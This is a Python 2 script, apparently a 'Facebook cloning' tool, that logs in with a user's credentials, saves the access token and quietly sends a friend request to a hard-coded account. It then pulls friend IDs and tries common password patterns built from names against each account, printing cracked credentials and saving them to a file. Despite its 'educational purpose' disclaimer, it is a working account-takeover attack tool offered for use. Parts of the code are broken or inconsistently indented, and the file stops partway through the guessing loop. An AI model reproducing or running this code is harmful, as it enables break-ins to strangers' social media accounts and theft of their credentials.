#!/usr/bin/python2

#coding=utf-8

#This Script Is Written By XP-TRICKER

  #=================================#

  # XP-TRICKER The Official Programmrer  #   #                                 #

  #                                 #

  #=================================#

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():

	print "\x1b[1;91mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.01)

		

#Dev:Tech-Abm

##### LOGO #####

logo ="""

\033[1;32m⊱• ────────────  ──────────── •⊰

\033[1;97m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█

\033[1;91m█ ╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗--- █ 

\033[1;93m█ ║║║╠─║─║─║║║║║╠─--- █

\033[1;96m█ ╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝--- █   

\033[1;97m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

\033[1;32m⊱• ────────────  ──────────── •⊰

\033[1;96m≫ \033[1;96m CODDED BY :\033[1;96m XP TRICKER 

\033[1;96m≫ \033[1;96m FACEBOOK:\033[1;94m Muhammad Ibtasam 

\033[1;96m≫ \033[1;96m YOUTUBE :\033[1;92m XP TRICKER - XIDI PAKISTANI

\033[1;96m≫ \033[1;96m NOTE :\033[1;95m DONOT  USE WIFI

\033[1;96m≫ \033[1;96m NOTE :\033[1;95m EDITING MY SCRIPT WILL NOT MAKE YOU A CODER

\033[1;96m≫ \033[1;96m NOTE :\033[1;95m HAVING PROBLEM? WHATSAPP ME.

\033[1;96m≫ \033[1;96m Disclamiar :\033[1;95m THIS IS FOR EDUCATIONAL PURPOSE ONLY

\033[1;96m≫ \033[1;96m WARNING [༗]:\033[1;95m I'M NOT RESPONSIBLE FOR ANY ILLEGAL USE 

\033[1;32m⊱• ──────────── ──────────── ────────────•⊰ 

\033[1;91m██╗░░██╗██████╗░████████╗

\033[1;91m╚██╗██╔╝██╔══██╗╚══██╔══╝

\033[1;96m░╚███╔╝░██████╔╝░░░██║░░░

\033[1;96m░██╔██╗░██╔═══╝░░░░██║░░░

\033[1;93m██╔╝╚██╗██║░░░░░░░░██║░░░

\033[1;93m╚═╝░░╚═╝╚═╝░░░░░░░░╚═╝░░░

\033[1;93m░█████╗░██╗░░░░░██╗

\033[1;96m██╔══██╗██║░░░░░██║

\033[1;91m███████║██║░░░░░██║

\033[1;93m██╔══██║██║░░░░░██║

\033[1;96m██║░░██║███████╗██║

\033[1;91m╚═╝░░╚═╝╚══════╝╚═╝

\033[1;98m───Game Changer─────

\033[1;32m⊱• ──────────── ──────────── ────────────•⊰"""

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

print """

\033[1;32m╔════•ೋೋ•ೋೋ•════╗ 

\033[1;96m   •••XIDI•••

\033[1;32m╚════•ೋೋ•ೋೋ•════╝"""

 

jalan('\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰')

jalan('\033[1;97mLoading•••')

jalan('\033[1;97m▒▒▒▒▒▒▒▒▒▒')

print"\033[1;32m0%"

jalan('\033[1;97m█▒▒▒▒▒▒▒▒▒')

print"\033[1;32m10%"

jalan('\033[1;97m███▒▒▒▒▒▒▒')

print"\033[1;32m30%"

jalan('\033[1;97m█████▒▒▒▒▒')

print"\033[1;32m50%"

jalan('\033[1;97m███████▒▒')

print"\033[1;32m80%"

jalan('\033[1;97m█████████')

print"\033[1;32m100%"

jalan('\033[1;31m COMPLETING•••')

jalan('\033[1;22m DONE•••PLEASE WAIT')

jalan('\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰')

jalan('\033[1;31mTHE OFFICIAL HACKER XP-TRICKER') 

jalan('\033[1;31mTHIS TOOL IS OWNER XP-TRICKER') 

jalan('\033[1;31mSO GUYS YOU FOLLOWS OUR THIS TOOL') 

jalan('\033[1;31mIF YOU HAVE ANY PROBLEM YOU CANTACT IN MY FACEBOOK') 

jalan('\033[1;31mTHIS TOOL IS ONLY EDUCATION PROMOTE') 

jalan('\033[1;31mSO LETS START HACKING')  

jalan('\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰')

jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓')

jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓')

jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▁█')

jalan('\033[1;35m▁▁▁▁▓♤▓▓▁▁▁▁███')

jalan('\033[1;35m▁▁▁▓♤▓▁▁▁▁▁██▓██')

jalan('\033[1;35m▁▁▓♤▓▁▁▁▁▁██▓█▓██')

jalan('\033[1;35m▁▓♤▓▁▁▁▁▁█▓▓█▓█▓▓█')

jalan('\033[1;35m▁▓♤▓▁▁▁▁█▓▓█▓▓▓█▓▓█')

jalan('\033[1;35m▁▁▓♤▓▁▁▁█▓▓▓█▓█▓▓▓█')

jalan('\033[1;35m▁▁▁▓♤▓▁▁▁██▓▓█▓▓██')

jalan('\033[1;35m▁▁▁▁▓♤▓▁▁▁██▓▓▓██')

jalan('\033[1;35m▁▁▁▁▁▓♤▓▁▁▁▁███-')

jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▓♤▓-')

jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓▁▓♤▓-')

jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓♤▓-')

jalan('\033[1;35m▁▁▁▁▁▁▁▁▁▓♤▓-')

jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓')

jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓')

jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▁█')

jalan('\033[1;35m▁▁▁▁▓♤▓▓▁▁▁▁███')

jalan('\033[1;35m▁▁▁▓♤▓▁▁▁▁▁██▓██')

jalan('\033[1;35m▁▁▓♤▓▁▁▁▁▁██▓█▓██')

jalan('\033[1;35m▁▓♤▓▁▁▁▁▁█▓▓█▓█▓▓█')

jalan('\033[1;35m▁▓♤▓▁▁▁▁█▓▓█▓▓▓█▓▓█')

jalan('\033[1;35m▁▁▓♤▓▁▁▁█▓▓▓█▓█▓▓▓█')

jalan('\033[1;35m▁▁▁▓♤▓▁▁▁██▓▓█▓▓██')

jalan('\033[1;35m▁▁▁▁▓♤▓▁▁▁██▓▓▓██')

jalan('\033[1;35m▁▁▁▁▁▓♤▓▁▁▁▁███-')

jalan('\033[1;35m▁▁▁▁▁▁▓♤▓▁▁▁▓♤▓-')

jalan('\033[1;35m▁▁▁▁▁▁▁▓♤▓▁▓♤▓-')

jalan('\033[1;35m▁▁▁▁▁▁▁▁▓♤▓♤▓-')

jalan('\033[1;35m▁▁▁▁▁▁▁▁▁▓♤▓-')

jalan('\033[1;32m⊱• ──────────── X–I–D–I ──────────── •⊰')

jalan('\033[1;34m⊱• ──────────── TOOL LOGIN ──────────── •⊰')

CorrectUsername = "XIDI"

CorrectPassword = "XP"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;33mTool Username \x1b[1;31mᐵ \x1b[1;32m")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;33mTool Password \x1b[1;31mᐵ \x1b[1;32m")

        if (password == CorrectPassword):

            print "\033[1;32mACCESS GRANTED AS " + username #Dev:XP-TRICKER

	    time.sleep(2)

            loop = 'false'

        else:

            print "\033[1;31mACCESS DENIED"

            os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')

    else:

        print "\033[1;31mACCESS DENIED"

        os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')

def login():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

		print logo

     	

		

		jalan(' \033[1;31m༻ \033[1;93mWarning: \033[1;96mUse a New Account To Login' )

		jalan(' \033[1;31m༻ \033[1;93mWarning: \033[1;31mDONOT USE YOUR PERSONAL ACCOUNT' ) 

		

		

		print('      \033[1;96m--->•••LOGIN WITH FACEBOOK•••<----')

		print('	' )

		id = raw_input('\033[1;96m[] \x1b[1;94mID/Email\x1b[1;32m: \x1b[1;32m')

		pwd = raw_input('\033[1;96m[+] \x1b[1;94mPassword\x1b[1;32m: \x1b[1;32m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\x1b[1;97mThere is no internet connection"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				print '\n\x1b[1;96m•••••༻Login Successful༻•••••'

				os.system('xdg-open https://www.youtube.com/channel/UCElYTLsUjYpkBbCgu3kZd8Q')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\x1b[1;31mThere is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\x1b[1;31mYour Account is on Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\x1b[1;94mPassword/Email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

	except KeyError:

		os.system('clear')

		print"\033[1;97mYour Account is on Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.ConnectionError:

		print"\x1b[1;94mThere is no internet connection"

		keluar()

	os.system("clear") #Dev:hamz

	print logo

	print "  \033[1;32m⚡\033[1;96m      Logged in User Info\033[1;32m⚡"

	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "

	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "

	print "\033[1;93mXP-TRICKER THE OFFICIAL PROGRAMMER[ X°P°T]"

	

	print "\033[1;32m⊱• ──────────── ──────────── ──────────── •⊰"

		

	print "\033[1;38m≫ \033[1;32m1.\x1b[1;96mStart Cloning•••"

	print "\033[1;38m≫ \033[1;32m0.\033[1;96mLogout            "

	pilih()

def pilih():

	unikers = raw_input("\n\033[1;96mInput Your Choice>>> \033[1;97m")

	if unikers =="":

		print "\x1b[1;97mFill in correctly"

		pilih()

	elif unikers =="1":

		super()

	elif unikers =="0":

		jalan('Token Removed')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih()

def super():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\033[1;32m≫\033[1;32m1.\x1b[1;96mClone From Friend List."

	print "\033[1;32m≫\033[1;32m2.\x1b[1;96mClone Friend List Public ID."

	print "\033[1;32m≫\033[1;31m0.\033[1;97mBack"

	pilih_super()

def pilih_super():

	peak = raw_input("\n\033[1;96mInput Your Choice>>> \033[1;97m")

	if peak =="":

		print "\x1b[1;94mFill in correctly"

		pilih_super()

	elif peak =="1":

		os.system('clear')

		print logo

		print "\033[1;32m Please Wait"

		jalan('\033[1;94mGetting IDs \033[1;94m•••••')

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)

		z = json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif peak =="2":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;32m〄\033[1;94mInput PublIc Id Username\033[1;33m: \033[1;97m")

		print """\033[1;32m⊱• ───────── XP-TRICKER THE OFFICIAL PROGRAMMER[ X.P.T] ───────── •⊰"""

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;97mName\033[1;97m:\033[1;96m "+op["name"]

		except KeyError:

			print"\x1b[1;31mID Not Found!"

			raw_input("\n\033[1;97m[\033[1;93mBack\033[1;97m]")

			super()

		print"\033[1;94mGetting IDs\033[1;97mPlease Be Patience..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;97mFill in correctly"

		pilih_super()

	

	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))

	jalan('\033[1;94mPlease Wait\033[1;94m•••••')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;94mCloning Is In Progress\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

	print """

\033[1;32m⊱• ───────── XP XIDI THE OFFICIAL PROGRAMMER───────── •⊰

\033[1;32m⊱• ─────────SUPPORT LIKE SUBCRIBE SHERE IN 3 GROUPS ||√ SO DON'T COPY OVER SCRIPT  ───────── •⊰

██╗░░██╗██╗██████╗░██╗██╗

╚██╗██╔╝██║██╔══██╗██║██║

░╚███╔╝░██║██║░░██║██║██║

░██╔██╗░██║██║░░██║██║██║

██╔╝╚██╗██║██████╔╝██║██║

╚═╝░░╚═╝╚═╝╚═════╝░╚═╝╚═╝"""

	

	

	jalan('\033[1;97m•••••••••••\033[1;93mCloning Start..\033[1;97m•••••••••• ')

     

	

	

			

	def main(arg):

		global oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass 

		try:													

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												

			b = json.loads(a.text)												

			pass1 = b['first_name'] + '786'												

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			q = json.load(data)												

			if 'access_token' in q:

				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				z = json.loads(x.text)

				print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											

				oks.append(user+pass1)

                        else:

			        if 'www.facebook.com' in q["error_msg"]:

				    print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'

				    cek = open("out/super_cp.txt", "a")

				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")

				    cek.close()

				    cekpoint.append(user+pass1)

                                else:

				    pass2 = b['first_name'] + '123'										

                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			            q = json.load(data)												

			            if 'access_token' in q:	

				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				            z = json.loads(x.text)

				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								

				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											

				            oks.append(user+pass2)

                                    else:

			                   if 'www.facebook.com' in q["error_msg"]:

				               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'

				               cek = open("out/super_cp.txt", "a")

				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")

				               cek.close()

				               cekpoint.append(user+pass2)								

				           else:											

					       pass3 = b['first_name']+'12345'										

					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										

					       q = json.load(data)										

					       if 'access_token' in q:	

						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                       z = json.loads(x.text)

						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'								

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							

						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									

						       oks.append(user+pass3)

                                               else:

			                               if 'www.facebook.com' in q["error_msg"]:

				                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'

				                           cek = open("out/super_cp.txt", "a")

				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")

				                           cek.close()

				                           cekpoint.append(user+pass3)									

					               else:										

						           pass4 = b['first_name'] + '123456'											

			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                   q = json.load(data)												

			                                   if 'access_token' in q:		

						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                   z = json.loads(x.text)

				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											

				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											

				                                   oks.append(user+pass4)

                                                           else:

			                                           if 'www.facebook.com' in q["error_msg"]:

				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'

				                                       cek = open("out/super_cp.txt", "a")

				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")

				                                       cek.close()

				                                       cekpoint.append(user+pass4)					

					                           else:									

						                       pass5 = 'Pakistan123'							

						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								

						                       q = json.load(data)								

						                       if 'access_token' in q:	

						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                               z = json.loads(x.text)

						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'						

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					

						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							

						                               oks.append(user+pass5)	

                                                                       else:

			                                                       if 'www.facebook.com' in q["error_msg"]:

				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'

				                                                   cek = open("out/super_cp.txt", "a")

				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")

				                                                   cek.close()

				                                                   cekpoint.append(user+pass5)					

						                               else:								

							                           pass6 = '786786'											

			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                           q = json.load(data)												

			                                                           if 'access_token' in q:	

								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                           z = json.loads(x.text)

				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									

				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											

				                                                           oks.append(user+pass6)

                                                                                   else:

			                                                                   if 'www.facebook.com' in q["error_msg"]:

				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'

				                                                               cek = open("out/super_cp.txt", "a")

				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")

				                                                               cek.close()

				                                                               cekpoint.append(user+pass6)	

						                                           else:							

								                               pass7 = b['first_name']+'1234'						

								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						

								                               q = json.load(data)						

								                               if 'access_token' in q:		

				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                       z = json.loads(x.text)

									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				

									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					

									                               oks.append(user+pass7)

                                                                                               else:

			                                                                               if 'www.facebook.com' in q["error_msg"]:

				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'

				                                                                           cek = open("out/super_cp.txt", "a")

				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")

				                                                                           cek.close()

				                                                                           cekpoint.append(user+pass7)           					

								                                       else:						

										                           pass8 = b['last_name'] + '12345678'											

			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												

			                                                                                   q = json.load(data)												

			                                                                                   if 'access_token' in q:		

										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])

				                                                                                   z = json.loads(x.text)

				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										

				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											

				                                                                                   oks.append(user+pass8)

                                                                                                           else:

			                                                                                           if 'www.facebook.com' in q["error_msg"]:

				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;93mCheckpoint'

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user

				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'

				                                                                                       cek = open("out/super_cp.txt", "a")

				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")

				                                                                                       cek.close()

				                                                                                       cekpoint.append(user+pass8)   	

										                                   else:					

										                                       pass9 = b['first_name'] + '1122'					

										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				

